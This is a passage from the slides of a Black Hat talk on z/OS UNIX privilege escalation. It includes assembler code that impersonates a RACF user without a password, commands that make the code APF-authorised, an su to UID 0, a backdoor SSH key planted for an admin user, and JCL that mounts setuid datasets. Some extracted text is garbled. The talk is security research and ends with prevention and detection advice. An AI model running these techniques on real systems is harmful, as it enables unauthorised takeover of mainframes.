`&LOAD. CSECT &LOAD. AMODE 31 YREGS , REGISTER SYMBOLS IN SYS1.MACLIB BAKR R14,0 CREATE A STACK ENTRY BUT DO NOT BRANCH LR R12,R15 USING &LOAD.,R12 PROGRAM BASE DS 0H **************************** *    CODE START            * **************************** MODESET KEY=ZERO,MODE=SUP L R5,ASCBPVT L R5,ASCBASXB(R5) SR R1,R1 ST R1,ASXBSENV(R5) RACROUTE REQUEST=VERIFY, ENVIR=CREATE,` `USERID=USERLEN,` `PASSCHK=NO, WORKA=RACWK, RELEASE=2.1, STAT=NO, LOG=NONE, MF=(E,RCLIST) MODESET KEY=NZERO,MODE=PROB **************************** *    EXIT                  * **************************** ST R15,LRETCODE PR DS 0F RACWK DS CL512 LRETCODE DS F RETURN CODE FLDGRPT DC A(1) DO NOT CHANGE FIELD1 DC CL8'PGMRNAME' DO NOT CHANGE USERLEN DC X'06' THIS LEN MUST BE EQUAL TO ID USERID USERID DC CL8'MASTER' USERID TO IMPERSONATE RESULT DC CL8'XXXXXXXX' DO NOT CHANGE RCLIST RACROUTE REQUEST=VERIFY,MF=L,RELEASE=2.1,` #BHUSA @BlackHatEvents `WORKA=*-* SC Q '22 '`

## Slide 70

\```
X
X
X
X
X
X
X
X
\```

\```
X
\```

#### **UNIX APF Privilege Escalation**

`&LOAD. CSECT &LOAD. AMODE 31 YREGS , REGISTER SYMBOLS IN SYS1.MACLIB BAKR R14,0 CREATE A STACK ENTRY BUT DO NOT BRANCH LR R12,R15 USING &LOAD.,R12 PROGRAM BASE DS 0H **************************** *    CODE START            * **************************** MODESET KEY=ZERO,MODE=SUP L R5,ASCBPVT L R5,ASCBASXB(R5) SR R1,R1 ST R1,ASXBSENV(R5) RACROUTE REQUEST=VERIFY, ENVIR=CREATE, USERID=USERLEN, PASSCHK=NO, WORKA=RACWK, RELEASE=2.1, STAT=NO, LOG=NONE, MF=(E,RCLIST) MODESET KEY=NZERO,MODE=PROB **************************** *    EXIT                  * **************************** ST R15,LRETCODE PR DS 0F RACWK DS CL512 LRETCODE DS F RETURN CODE FLDGRPT DC A(1) DO NOT CHANGE FIELD1 DC CL8'PGMRNAME' DO NOT CHANGE USERLEN DC X'06' THIS LEN MUST BE EQUAL TO ID USERID` `USERID DC CL8'MASTER' USERID TO IMPERSONATE` `RESULT DC CL8'XXXXXXXX' DO NOT CHANGE RCLIST RACROUTE REQUEST=VERIFY,MF=L,RELEASE=2.1,` #BHUSA @BlackHatEvents `WORKA=*-* SC Q '22 '`

## Slide 71

#### **But First we Need a User**

**> ./ENUM.rexx WHO **** Started Task - Owner ***** RACF      - STCUSR TSO       - STCUSR JES2      - NET       - STCUSR SDSFAUX   - STCUSR SDSF      - STCUSR TCPIP     - STCUSR SYSLOGD   - STCUSR TCPTEL    - STCUSR CHAD      - IBMUSER CSF       - STCUSR**

#BHUSA @BlackHatEvents

## Slide 72

#### **But First we Need a User**

**> ./ENUM.rexx WHO **** Started Task - Owner ***** RACF      - STCUSR TSO       - STCUSR JES2      - NET       - STCUSR SDSFAUX   - STCUSR SDSF      - STCUSR TCPIP     - STCUSR SYSLOGD   - STCUSR TCPTEL    - STCUSR CHAD      - IBMUSER CSF       - STCUSR**

#BHUSA @BlackHatEvents

## Slide 73

#### **UNIX APF Privilege Escalation**

&LOAD. CSECT
&LOAD. AMODE 31
YREGS , REGISTER SYMBOLS IN SYS1.MACLIB
BAKR R14,0 CREATE A STACK ENTRY BUT DO NOT BRANCH
LR R12,R15
USING &LOAD.,R12 PROGRAM BASE
DS 0H
****************************
*    CODE START            *
****************************
MODESET KEY=ZERO,MODE=SUP
L R5,ASCBPVT
L R5,ASCBASXB(R5)
SR R1,R1
ST R1,ASXBSENV(R5)
RACROUTE REQUEST=VERIFY, X
ENVIR=CREATE, X
USERID=USERLEN, X
PASSCHK=NO, X
WORKA=RACWK, X
RELEASE=2.1, X
STAT=NO, X
LOG=NONE, X
MF=(E,RCLIST)
MODESET KEY=NZERO,MODE=PROB
****************************
*    EXIT                  *
****************************
ST R15,LRETCODE
PR
DS 0F
RACWK DS CL512
LRETCODE DS F RETURN CODE
FLDGRPT DC A(1) DO NOT CHANGE
FIELD1 DC CL8'PGMRNAME' DO NOT CHANGE
USERLEN DC X'04' THIS LEN MUST BE EQUAL TO ID USERID
USERID DC CL8’CHAD’   USERID TO IMPERSONATE
RESULT DC CL8'XXXXXXXX' DO NOT CHANGE
RCLIST RACROUTE REQUEST=VERIFY,MF=L,RELEASE=2.1, #BHUSA @BlackHatEvents X
WORKA=*-*
SC Q '22 '

## Slide 74

#### **Make It Work**

##### **First we assemble it:**

- /bin/as -o ./src/racr.o ./src/racr.s

**Then we link it:**

- /bin/ld -b "AC=1" -S "//'SYS1.CSSLIB'" -o ./bin/racr ./src/racr.o

**Then we make it APF authorized**

- /bin/extattr +a ./bin/racr

#BHUSA @BlackHatEvents

## Slide 75

APF Privesc
Demo

#BHUSA @BlackHatEvents

## Slide 76

#### **SU to UID 0**

> ./OMVSSed.sh

... [+] We can su to root without a password! ...

dr-xr-xr-x    2 CHAD     RULES       8192 Jul 16 10:15 DEFCON/ dr-xr-xr-x    2 PHIL     DROOLS      8192 Jul 16 18:05 BlackHat/ -rwxrwxrwx 1 OMVS     OMVSGRP     1163 Jul 25  2024 /etc/inetd.conf -rwxrwxrwx 2 OMVS     OMVSGRP     1024 Jul 13 16:05 /bin/run.sh ... [+] Unix Privileged RACF resources: SUPERUSER.FILESYS.MOUNT ...

[+] We can issue extattr +a!

#BHUSA @BlackHatEvents

## Slide 77

**SU to UID 0**

**If you have access to BPX.SUPERUSER in RACF you can change your effective UID to 0 But only IN UNIX, our RACF ID remains the same Having UID 0 means we have (almost) full control of the UNIX file system On Linux we would call this “Game Over” It’s not quite game over in z/OS UNIX…. yet**

#BHUSA @BlackHatEvents

## Slide 78

> id uid=1000001(PHIL) gid=1000001(NETSPI) >su

# id uid=0(OMVSKERN) gid=1000001(NETSPI) # tsocmd lu lu USER=PHIL  NAME=PHIL YOUNG

#BHUSA @BlackHatEvents

## Slide 79

> id

> id uid=1000001(PHIL) gid=1000001(NETSPI) >su # id uid=0(OMVSKERN) gid=1000001(NETSPI) # tsocmd lu lu USER=PHIL  NAME=PHIL YOUNG

#BHUSA @BlackHatEvents

## Slide 80

> id

> id uid=1000001(PHIL) gid=1000001(NETSPI) >su # id uid=0(OMVSKERN) gid=1000001(NETSPI) # tsocmd lu lu USER=PHIL  NAME=PHIL YOUNG

#BHUSA @BlackHatEvents

## Slide 81

> id uid=1000001(PHIL) gid=1000001(NETSPI) >su

# id uid=0(OMVSKERN) gid=1000001(NETSPI) # tsocmd lu lu USER=PHIL  NAME=PHIL YOUNG

#BHUSA @BlackHatEvents

## Slide 82

> id uid=1000001(PHIL) gid=1000001(NETSPI) >su

# id uid=0(OMVSKERN) gid=1000001(NETSPI) # tsocmd lu lu

USER=PHIL  NAME=PHIL YOUNG

#BHUSA @BlackHatEvents

## Slide 83

#### **SSH Keys**

**Why don’t we add our own SSH key to an admin users home folder?**

#BHUSA @BlackHatEvents

## Slide 84

> su
#

#BHUSA @BlackHatEvents

## Slide 85

> su

**> su # ls -al MARK total 34 drwx-----2 MARK     CHALS       8192 Feb 21 00:20 . drwxr-xr-x  166 OMVS     OMVSGRP     8192 Feb 17 17:31 .. -rw-r----1 MARK     CHALS         18 Feb 16 10:13 .profile #**

#BHUSA @BlackHatEvents

## Slide 86

> su

**> su # ls -al MARK total 34 drwx-----2 MARK     CHALS       8192 Feb 21 00:20 . drwxr-xr-x  166 OMVS     OMVSGRP     8192 Feb 17 17:31 .. -rw-r----1 MARK     CHALS         18 Feb 16 10:13 .profile # mkdir MARK/.ssh #**

#BHUSA @BlackHatEvents

## Slide 87

> su

**> su # ls -al MARK total 34 drwx-----2 MARK     CHALS       8192 Feb 21 00:20 . drwxr-xr-x  166 OMVS     OMVSGRP     8192 Feb 17 17:31 .. -rw-r----1 MARK     CHALS         18 Feb 16 10:13 .profile # mkdir MARK/.ssh # touch MARK/.ssh/authorized_keys #**

#BHUSA @BlackHatEvents

## Slide 88

> su

**> su # ls -al MARK total 34 drwx-----2 MARK     CHALS       8192 Feb 21 00:20 . drwxr-xr-x  166 OMVS     OMVSGRP     8192 Feb 17 17:31 .. -rw-r----1 MARK     CHALS         18 Feb 16 10:13 .profile # mkdir MARK/.ssh # touch MARK/.ssh/authorized_keys # chown -R MARK:CHALS MARK/.ssh #**

#BHUSA @BlackHatEvents

## Slide 89

> su

**> su # ls -al MARK total 34 drwx-----2 MARK     CHALS       8192 Feb 21 00:20 . drwxr-xr-x  166 OMVS     OMVSGRP     8192 Feb 17 17:31 .. -rw-r----1 MARK     CHALS         18 Feb 16 10:13 .profile # mkdir MARK/.ssh # touch MARK/.ssh/authorized_keys # chown -R MARK:CHALS MARK/.ssh # chmod -R 600 MARK/.ssh #**

#BHUSA @BlackHatEvents

## Slide 90

> su

**> su # ls -al MARK total 34 drwx-----2 MARK     CHALS       8192 Feb 21 00:20 . drwxr-xr-x  166 OMVS     OMVSGRP     8192 Feb 17 17:31 .. -rw-r----1 MARK     CHALS         18 Feb 16 10:13 .profile # mkdir MARK/.ssh # touch MARK/.ssh/authorized_keys # chown -R MARK:CHALS MARK/.ssh # chmod -R 600 MARK/.ssh # echo $PUBKEY > MARK/.ssh/authorized_keys #**

#BHUSA @BlackHatEvents

## Slide 91

> su

**> su # ls -al MARK total 34 drwx-----2 MARK     CHALS       8192 Feb 21 00:20 . drwxr-xr-x  166 OMVS     OMVSGRP     8192 Feb 17 17:31 .. -rw-r----1 MARK     CHALS         18 Feb 16 10:13 .profile # mkdir MARK/.ssh # touch MARK/.ssh/authorized_keys # chown -R MARK:CHALS MARK/.ssh # chmod -R 600 MARK/.ssh # echo $PUBKEY > MARK/.ssh/authorized_keys # ls -al MARK/.ssh/ total 32 drw------2 MARK     CHALS       8192 Feb 21 00:21 . drwx-----3 MARK     CHALS       8192 Feb 21 00:21 .. -rw------1 MARK     CHALS        587 Feb 21 00:21 authorized_keys** #BHUSA @BlackHatEvents

## Slide 92

**~/Documents/Talks/SHARE2025 » ssh -i hack_the_planet mark@mainframe.mfctf.com**

#BHUSA @BlackHatEvents

## Slide 93

**~/Documents/Talks/SHARE2025 » ssh -i hack_the_planet mark@mainframe.mfctf.com MARK:/u/MARK: >**

#BHUSA @BlackHatEvents

## Slide 94

**~/Documents/Talks/SHARE2025 » ssh -i hack_the_planet mark@mainframe.mfctf.com MARK:/u/MARK: > id uid=1216(MARK) gid=1009(CHALS)**

#BHUSA @BlackHatEvents

## Slide 95

**~/Documents/Talks/SHARE2025 » ssh -i hack_the_planet mark@mainframe.mfctf.com MARK:/u/MARK: > id uid=1216(MARK) gid=1009(CHALS) MARK:/u/MARK: > tsocmd lu lu**

**USER=MARK  NAME=MARK MY WORDS        OWNER=IBMUSER   CREATED=20.195 DEFAULT-GROUP=CHALS   PASSDATE=25.195 PASS-INTERVAL= 90 PHRASEDATE=N/A ATTRIBUTES=SPECIAL OPERATIONS REVOKE DATE=NONE   RESUME DATE=NONE**

#BHUSA @BlackHatEvents

## Slide 96

**~/Documents/Talks/SHARE2025 » ssh -i hack_the_planet mark@mainframe.mfctf.com MARK:/u/MARK: > id uid=1216(MARK) gid=1009(CHALS) MARK:/u/MARK: > tsocmd lu lu**

**USER=MARK  NAME=MARK MY WORDS        OWNER=IBMUSER   CREATED=20.195 DEFAULT-GROUP=CHALS   PASSDATE=25.195 PASS-INTERVAL= 90 PHRASEDATE=N/A ATTRIBUTES=SPECIAL OPERATIONS REVOKE DATE=NONE   RESUME DATE=NONE**

#BHUSA @BlackHatEvents

## Slide 97

#### **Mounting Datasets**

> ./OMVSSed.sh

...

[+] We can su to root without a password!

...

dr-xr-xr-x    2 CHAD     RULES       8192 Jul 16 10:15 DEFCON/ dr-xr-xr-x    2 PHIL     DROOLS      8192 Jul 16 18:05 BlackHat/ -rwxrwxrwx 1 OMVS     OMVSGRP     1163 Jul 25  2024 /etc/inetd.conf -rwxrwxrwx 2 OMVS     OMVSGRP     1024 Jul 13 16:05 /bin/run.sh ... [+] Unix Privileged RACF resources: SUPERUSER.FILESYS.MOUNT ...

[+] We can issue extattr +a!

#BHUSA @BlackHatEvents

## Slide 98

#### **Understanding HFS/zFS**

**HFS = Hierarchical File System zFS = z/OS File System**

**You mount a dataset to a mount point**

**PHIL.OMVSHOME.ZFS** à **/home/PHIL**

**Using z/OS tools you can always create your own and mount it, but the SETUID and APF bits aren’t preserved… unless**

#BHUSA @BlackHatEvents

## Slide 99

#### **APF & SETUID Bits**

**RACF UPDATE access to either:**

- **SUPERUSER.FILESYS.USERMOUNT**

- **SUPERUSER.FILESYS.MOUNT**

**(READ allows mounting but it does not honor the security bits)**

#BHUSA @BlackHatEvents

## Slide 100

#### **Crafting our Privilege Escalation**

**1. Create a zFS dataset on your own LPAR and mount it**

**2. Create your setuid and APF programs and copy them to your new zFS**

**3. Unmount it**

**4. Package it up with some JCL to an XMI file**

**5. Transfer it to target mainframe using SCP**

**6. RECEIVE, extract and mount it with JCL using the USS submit command**

**7. Run your tools**

#BHUSA @BlackHatEvents

## Slide 101

\```
//MOUNTEXECPGM=IKJEFT01
//SYSPRINTDDSYSOUT=*
//SYSTSPRTDDSYSOUT=*
//SYSTSINDD *,SYMBOLS=JCLONLY
PROFILE NOPREFIX
MOUNT FILESYSTEM(HACK.THE.PLANET) -
TYPE(ZFS) -
MODE(RDWR) -
SETUID -
MOUNTPOINT(‘/tmp/hack_the_planet')
/*
//*
\```

#BHUSA @BlackHatEvents

## Slide 102

\```
//MOUNTEXECPGM=IKJEFT01
//SYSPRINTDDSYSOUT=*
//SYSTSPRTDDSYSOUT=*
//SYSTSINDD *,SYMBOLS=JCLONLY
PROFILE NOPREFIX
MOUNT FILESYSTEM(HACK.THE.PLANET) -
TYPE(ZFS) -
MODE(RDWR) -
SETUID -
MOUNTPOINT(‘/tmp/hack_the_planet')
/*
//*
\```

#BHUSA @BlackHatEvents

## Slide 103

#### **On Our Target LPAR**

> ls -alE /tmp/hack_the_planet/bin total 224 drwxrwxrwx 2 960016   OMVSGRP     8192 Jan 28  2025 . drwxrwxrwx 4 960013   OMVSGRP     8192 Jan 28  2025 .. -rwxrwxrwx a-s1 960016   OMVSGRP     4096 Jan 28  2025 modwshl -rwsrwxrwx 1 OMVS     OMVSGRP    73728 Jan 28  2025 newsh -ps-rwxrwxrwx a-s1 960016   OMVSGRP     8192 Jan 28  2025 oeconsole

#BHUSA @BlackHatEvents

## Slide 104

> ls -alE /tmp/hack_the_planet/bin total 224 drwxrwxrwx 2 960016   OMVSGRP     8192 Jan 28  2025 . drwxrwxrwx 4 960013   OMVSGRP     8192 Jan 28  2025 .. -rwxrwxrwx a-s1 960016   OMVSGRP     4096 Jan 28  2025 modwshl -rwsrwxrwx 1 OMVS     OMVSGRP    73728 Jan 28  2025 newsh -ps- -rwxrwxrwx a-s1 960016   OMVSGRP     8192 Jan 28  2025 oeconsole

#BHUSA @BlackHatEvents

## Slide 105

> ls -alE /tmp/hack_the_planet/bin total 224 drwxrwxrwx 2 960016   OMVSGRP     8192 Jan 28  2025 . drwxrwxrwx 4 960013   OMVSGRP     8192 Jan 28  2025 .. -rwxrwxrwx a-s1 960016   OMVSGRP     4096 Jan 28  2025 modwshl -rwsrwxrwx 1 OMVS     OMVSGRP    73728 Jan 28  2025 newsh -ps-rwxrwxrwx a-s1 960016   OMVSGRP     8192 Jan 28  2025 oeconsole

#BHUSA @BlackHatEvents

## Slide 106

> ls -alE /tmp/hack_the_planet/bin total 224 drwxrwxrwx 2 960016   OMVSGRP     8192 Jan 28  2025 . drwxrwxrwx 4 960013   OMVSGRP     8192 Jan 28  2025 .. -rwxrwxrwx a-s1 960016   OMVSGRP     4096 Jan 28  2025 modwshl -rwsrwxrwx 1 OMVS     OMVSGRP    73728 Jan 28  2025 newsh -ps- -rwxrwxrwx a-s1 960016   OMVSGRP     8192 Jan 28  2025 oeconsole

#BHUSA @BlackHatEvents

## Slide 107

#### **APF Buffer Overflows**

**Lots of UNIX programs are written in C**

**Just like any OS you can find z/OS UNIX programs that have buffer overflows If that program linked AC=1 and APF authorized we can take over the system**

#BHUSA @BlackHatEvents

## Slide 108

\```
find/\( -exta\)-typef \
-execls-laE{}2>/dev/null\;
\```

#BHUSA @BlackHatEvents

## Slide 109

\```
find/\(-exta \)-typef \
-execls-laE{}2>/dev/null\;
\```

#BHUSA @BlackHatEvents

## Slide 110

|-rwxr-xr-x|aps-|2 OMVSKERN OMVSGRP|389120 Sep 11|2023|/Z31A/usr/lpp/Printsrv/lib/IBM/AOPJNIXP|
|---|---|---|---|---|---|
|-rwxr-xr-x|a-s-|2 OMVSKERN OMVSGRP
|81920 Sep 11
|2023
|/Z31A/usr/lpp/cpo/lib/IBM/CPOII
|
|-rwxr-xr-x|aps-|2 OMVSKERN OMVSGRP
|13185024 Jun  2
|202
|3 /Z31A/usr/lpp/pkiserv/lib/pkiapi.dll
|
|-rwxr-xr-x|aps-|2 OMVSKERN SYS1|171968 Apr 15|2024|/Z31A/usr/lpp/IBM/zexpl/IBM/FEKFLOGS|
|-rwxr-xr-x|a-s-|2 OMVSKERN OMVSGRP
|61440 Sep 11
|2023
|/Z31A/usr/lpp/cpo/lib/IBM/CPOZCONS
|
|-rwxr-xr-x|aps-|2 OMVSKERN OMVSGRP|20480 Sep 11|2023|/Z31A/usr/lpp/Printsrv/lib/IBM/AOPFILTR|
|-rwxr-xr-x|a-s-|1 OMVSKERN SYS1|180224 Mar 25|2024|/Z31A/usr/lpp/IBM/zoautil/bin/ddlshelper|
|-rwxr-xr-x|a-s-|2 OMVSKERN OMVSGRP|2555904 Apr 12|2023|/Z31A/usr/lpp/tcpip/bin/ipsec|
|-rwxr-xr-x|ap--|1 OMVSKERN SYS1|1073152 Jun 12|2023|/Z31A/usr/lpp/IBM/zosconnect/v3r0/wlp/lib/native/z|
|-rwxr-xr-x|a-s-|2 OMVSKERN OMVSGRP|3600384 Sep 11|2023|/Z31A/usr/lpp/Printsrv/bin/IBM/AOPLP|
|-rwxr-xr-x|aps-|2 OMVSKERN SYS1
|131072 Oct 13
|2023
|/Z31A/usr/lpp/IBM/PrintXform/V1R2/AFPxPDF/lib/afpx
|
|-rwxr-xr-x|aps-|2 OMVSKERN OMVSGRP|110640 Apr 12|2023|/Z31A/usr/lpp/tcpip/lib/libcmpiOSBase_IPProtocolEn|
|-rwxr-xr-x|aps-|`fid/`
2 OMVSKERN SYS1|`(`**`t `**
90112 Apr 15|
2024|`)-tf \`
/Z31A/usr/lpp/IBM/zexpl/IBM/HUHFCORE|
|-rwxr-xr-x|aps-|`n  `
2 OMVSKERN OMVSGRP
|**`-ex  `**
118800 Apr 12
|
2023
|`ype  `
/Z31A/usr/lpp/tcpip/lib/libcmpiOSBase_NetworkPortI
|
|-rwxr-xr-x|aps-|`-execl`
1 OMVSKERN OMVSGRP|`-laE{`
24576 Mar 14|2023|`>/dev/null\`
/Z31A/usr/lpp/wbem/lib/libcfzsys64.so|
|-rwxr-xr-x|aps-|
2 OMVSKERN OMVSGRP
|
3465216 Jun  2
|
2023
|`;`
/Z31A/usr/lpp/pkiserv/lib/policy.dll
|
|-rwxr-xr-x|a-s-|1 OMVSKERN SYS1|200704 Mar 25|2024|/Z31A/usr/lpp/IBM/zoautil/bin/jsubhelper|
|-rwxr-xr-x|aps-|2 OMVSKERN OMVSGRP
|376832 Jun  2
|2023
|/Z31A/usr/lpp/pkiserv/lib/ossrv.dll
|
|-rwx--S---|a---|2 OMVSKERN OMVSGRP|3657728 Sep 11|2023|/Z31A/usr/lpp/Printsrv/bin/IBM/AOPD|
|-rwxr-xr-x|a-s-|2 OMVSKERN OMVSGRP
|544768 Jun  2
|2023
|/Z31A/usr/lpp/zosmf/bin/izugBCPiiQuery
|
|-rwxr-x---|a-s-|2 OMVSKERN OMVSGRP
|2789376 Jun  2
|2023
|/Z31A/usr/lpp/Printsrv/bin/IBM/AOPXCFUT
|
|-rwx--S---|a---|2 OMVSKERN OMVSGRP
|937984 Sep 11
|2023
|/Z31A/usr/lpp/Printsrv/bin/aopsubd
|
|-rwxr-xr-x|a-s-|2 OMVSKERN SYS1
|118784 Aug  8
|2023
|/Z31A/usr/lpp/IBM/zee/IBM/FELFVLIC
|
|-rwxr-xr-x|a-s-|2 OMVSKERN OMVSGRP|49152 Sep 11|2023|/Z31A/usr/lpp/cpo/lib/libcpostream.so|
|-rwxr-xr-x|apsl|2 OMVSKERN OMVSGRP|1224704 Sep 11|2023|/Z31A/usr/lpp/Printsrv/lib/IBM/AOPSODB|
|-rwxr-x---|a-s-|2 OMVSKERN OMVSGRP|2789376 Jun  2|2023|/Z31A/usr/lpp/Printsrv/bin/aopxcfut|
|-rwxr-xr-x|a-s-|2 OMVSKERN OMVSGRP
|2777088 Sep 11
|2023
|/Z31A/usr/lpp/Printsrv/bin/IBM/AOPSTAT
|
|-rwxr-xr-x|ap--|1 OMVSKERN SYS1
2 OMVSKERN SYS1|593920 Jun 12
2199 A
8|2023
2023|#BHUSA @BlackHatEvents
/Z31A/usr/lpp/IBM/zosconnect/v3r0/wlp/lib/native/z
 /Z31A/
/l
/IBM/
/bi /f kf
f|

## Slide 111

**Getting into the complexities of writing a z/OS buffer overflow would take hours**

#BHUSA @BlackHatEvents

## Slide 112

**Jake Labelle - Doing the Impossible - How I Found Mainframe Buffer Overflows**

**Security Necromancy: Further DEFCON 30 – Mainframe Buffer adventures in Mainframe Overflows - Workshop Hacking**

<u>https://www.youtube.com/watch?v=Mkfk2UcmA-8</u>

<u>https://www.youtube.com/watch?v=LgmqiugpVyU https://github.com/mainframed/DC30_Workshop</u>

#BHUSA @BlackHatEvents

## Slide 113

#### **APF Demo Video**

#BHUSA @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 83/100 on the text kept, 83/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
APF Demo
Video

07 00 CA FE  BA BE 18 CE  41 10 00 3C  0A 6B 58 50
02 24 58 55  00 6C 58 55  00 C8 94 00  50 26 96 B1
50 26 41 10  C0 24 0A 23  0A 03 00 14  00 00 E6 D9
C9 E3 C9 D5  C7 40 C3 D6  D4 D7 D3 C5  E3 C5 CA FE
BA BE 00 00  00 00

#BHUSA  @BlackHatEvents
```

## Slide 114

APF Privesc
Demo

#BHUSA @BlackHatEvents

## Slide 115

#### **Honorable Mentions**

**Improperly using your ESM (RACF, etc) to manage file permissions World writeable file in /bin that was run as part of /etc/profile World writeable temp logs before they went to Splunk LFI vulnerable web app**

#BHUSA @BlackHatEvents

## Slide 116

Prevention &
Detection
#BHUSA @BlackHatEvents

## Slide 117

#### **Prevention**

**Review and fix your UNIX file permission issues**

**Review and strictly control access to:**

- **BPX.SUPERUSER in FACILITY class** ß **su to root**

- **BPX.FILEATTR.APF in FACILITY class** ß **APF authoritized bit**

- **SUPERUSER.FILESYS.** in the UNIXPRIV class** ß **Mounting datasets**

**Test your file permissions, make sure what z/OS UNIX says is true**

#BHUSA @BlackHatEvents

## Slide 118

#### **Detection**

**Monitor SMF messages for use of:**

- **BPX.SUPERUSER in FACILITY class**

- **BPX.FILEATTR.APF in FACILITY class**

- **SUPERUSER.FILESYS.** in the UNIXPRIV class**

**Detect large number of unauthorized attempts to access files Detect multiple (in the thousands) of invalid TCP connections, outbound Implement UNIX file system auditing**

#BHUSA @BlackHatEvents

## Slide 119

#### **UNIX File System Monitoring**

> ls -lW

- -rw-r--r-fff---rw-r--r-fff---rw-r--r-fff---rw-r--r-fff---

- 1 PHIL     DROOLS  784 Feb 19 11:27 section.1.txt 1 PHIL     DROOLS  516 Feb 19 13:49 section.2.txt 1 PHIL     DROOLS 2573 Feb 19 18:50 section.3.txt 1 PHIL     DROOLS  615 Feb 21 01:43 section.4.txt

#BHUSA @BlackHatEvents

## Slide 120

#### **UNIX File System Monitoring**

> ls -lW

- -rw-r--r-fff---rw-r--r-fff---rw-r--r-fff---rw-r--r-fff---

- 1 PHIL     DROOLS  784 Feb 19 11:27 section.1.txt 1 PHIL     DROOLS  516 Feb 19 13:49 section.2.txt 1 PHIL     DROOLS 2573 Feb 19 18:50 section.3.txt 1 PHIL     DROOLS  615 Feb 21 01:43 section.4.txt

#BHUSA @BlackHatEvents

## Slide 121

#### **UNIX File System Monitoring**

> ls -lW

- -rw-r--r-- **fff---** -rw-r--r-fff---rw-r--r-fff---rw-r--r-fff---

   - 1 PHIL     DROOLS  784 Feb 19 11:27 section.1.txt 1 PHIL     DROOLS  516 Feb 19 13:49 section.2.txt 1 PHIL     DROOLS 2573 Feb 19 18:50 section.3.txt 1 PHIL     DROOLS  615 Feb 21 01:43 section.4.txt

#BHUSA @BlackHatEvents

## Slide 122

fff ---

#BHUSA @BlackHatEvents

## Slide 123

Admin
Controlled
fff ---
User
Controlled
#BHUSA @BlackHatEvents

## Slide 124

READ
EXECUTE
fff
WRITE
#BHUSA @BlackHatEvents

## Slide 125

**We can change these with the UNIX command** **_chaudit_**

**> chaudit rwx=sf section.*.txt >**

#BHUSA @BlackHatEvents

## Slide 126

**We can change these with the UNIX command** **_chaudit_**

**> chaudit rwx=sf section.*.txt > ls -lW section***

-rw-r--r-aaa--1 PHIL     DROOLS  784 Feb 19 11:27 section.1.txt -rw-r--r-aaa--1 PHIL     DROOLS  516 Feb 19 13:49 section.2.txt -rw-r--r-aaa--1 PHIL     DROOLS 2573 Feb 19 18:50 section.3.txt -rw-r--r-aaa--1 PHIL     DROOLS  615 Feb 21 01:43 section.4.txt

#BHUSA @BlackHatEvents

## Slide 127

**We can change these with the UNIX command** **_chaudit_**

**> chaudit rwx=sf section.*.txt > ls -lW section***

-rw-r--r-aaa--1 PHIL     DROOLS  784 Feb 19 11:27 section.1.txt -rw-r--r-aaa--1 PHIL     DROOLS  516 Feb 19 13:49 section.2.txt -rw-r--r-aaa--1 PHIL     DROOLS 2573 Feb 19 18:50 section.3.txt -rw-r--r-aaa--1 PHIL     DROOLS  615 Feb 21 01:43 section.4.txt

#BHUSA @BlackHatEvents

## Slide 128

Shout Outs
#BHUSA @BlackHatEvents

## Slide 129

#### **Thank You**

**The mainframe hacker community The moshix discord The mainframe community BlackHat for having us! Our employers for putting up with us**

#BHUSA @BlackHatEvents

## Slide 130

## **Chad Rikansrud**

**Philip Young** _“Soldier of Fortran”_

“Bigendian Smalls”
Chief Mainframe Hacker
BSKY:  @bigendiansmalls.com

**Director, Mainframe Penetration Testing**

**Socials:** @mainframed767

Socials:  @mainframed767 BSKY:  @bigendiansmalls.com
Mastadon:  @mainframed767@infosec.exchange
Email:  Email:
Philip Young
• mainframed767@gmail.com § chad.rikansrud@broadcom.com
• Philip.young@netspi.comPhilip.young@netspi.com
@mainframed767@infosec.exchange
148
#BHUSA @BlackHatEvents
